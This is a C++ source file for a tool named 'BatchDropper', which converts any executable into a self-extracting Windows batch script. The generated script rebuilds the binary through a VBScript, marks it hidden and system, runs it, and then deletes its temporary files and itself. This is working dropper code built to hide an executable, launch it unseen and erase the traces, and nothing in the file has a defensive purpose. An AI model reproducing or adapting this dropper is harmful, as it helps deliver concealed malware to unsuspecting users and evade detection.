#include <iostream>
#include <fstream>
#include "Utils.h"
#define HEX_FILE_LINE 76 // 76 Characters in one line.

int main(int argc, char* args[])
{
    cout << "BatchDropper.exe 1.0 by PA\nA simple program that converts every file type to batch." << endl;
    cout << "Usage: " << get_file_name(args[0]) << " [input] [output]" << endl;
    if (argc != 3)
    {
        parse_error("[-] Invalid Arguments.");
    }
    ifstream input(args[1], ios::in | ios::binary | ios::ate);
    ofstream output(args[2], ios::out);
    string hexs;
    if (!input.bad())
    {
        ifstream::pos_type size = input.tellg();
        char* memblock = new char[size];
        input.seekg(0, ios::beg);
        input.read(memblock, size);
        input.close();
        hexs = ToHex(string(memblock, memblock + size));
    }
    else parse_error("[-] Could not open the input stream for reading.");
    if (!output.bad())
    {
        string fileName = get_file_name(args[2]);
        fileName.replace(fileName.end() - 4, fileName.end(), ".exe");
        output << "@echo off" << "\n";
        output << "if exist " << fileName << " (attrib -h -s " << fileName << "\n";
        output << "del " << fileName << ")\n";
        output << "echo \"";
        for (size_t i = 0; i < hexs.size(); i++)
        {
            output << hexs[i];
            if (i == HEX_FILE_LINE)
            {
                output << "\">" << "x.bin" << "\necho \"";
            }
            else if (i % HEX_FILE_LINE == 0 && i > HEX_FILE_LINE)
            {
                output << "\">>" << "x.bin" << "\necho \"";
            }
            else if (i % 2 != 0 && i != hexs.size() - 1) output << ' ';
        }
        output << "\">>" << "x.bin" << "\n";
        output << "attrib +h +s x.bin" << "\n";
        // Read and write the file content.
        output << "echo Set objFileToRead = CreateObject(\"Scripting.FileSystemObject\").OpenTextFile(\"x.bin\",1) >> x.vbs" << "\n";
        output << "echo strFileText = objFileToRead.ReadAll() >> x.vbs" << "\n";
        output << "echo strFileText = Replace(strFileText, vbCrLf, \"\") >> x.vbs" << "\n";
        output << "echo strFileText = Replace(strFileText, chr(34), \"\") >> x.vbs" << "\n";
        output << "echo objFileToRead.Close >> x.vbs" << "\n";
        output << "echo hexarr = Split(strFileText) >> x.vbs" << "\n";
        output << "echo ReDim binarr(UBound(hexarr)) >> x.vbs" << "\n";
        output << "echo For i = 0 To UBound(hexarr) >> x.vbs" << "\n";
        output << "echo binarr(i) = Chr(CInt(\"&h\" ^& hexarr(i))) >> x.vbs" << "\n";
        output << "echo Next >> x.vbs" << "\n";
        output << "echo binstr = Join(binarr, \"\") >> x.vbs" << "\n";
        output << "echo Set objFileToWrite = CreateObject(\"Scripting.FileSystemObject\").OpenTextFile(\"x.exe\",2,true) >> x.vbs" << "\n";
        output << "echo objFileToWrite.WriteLine(binstr) >> x.vbs" << "\n";
        output << "echo objFileToWrite.Close >> x.vbs" << "\n";
        // Hide the output file.
        output << "echo Set objFSO = CreateObject(\"Scripting.FileSystemObject\") >> x.vbs" << "\n";
        output << "echo Set mapFile = objFSO.GetFile(\"x.exe\") >> x.vbs" << "\n";
        output << "echo mapFile.Attributes = 3 + 4 >> x.vbs" << "\n";
        // Runs it
        output << "echo Dim objShell >> x.vbs" << "\n";
        output << "echo Set objShell = WScript.CreateObject(\"WScript.Shell\") >> x.vbs" << "\n";
        output << "echo objShell.Run(\"""x.exe\""") >> x.vbs" << "\n";
        output << "attrib +h +s " << "x.vbs" << "\n";
        output << "start x.vbs" << "\n";
        output << "attrib -h -s x.bin" << "\n";
        output << "del " << "x.bin" << "\n";
        output << "attrib -h -s x.vbs" << "\n";
        output << "del " << "x.vbs" << "\n";
        output << "if exist " << args[2] << " (del " << args[2] << ") \n";
        output.close();
    }
    else parse_error("[-] Could not open the output stream for writing.");
    return 0;
}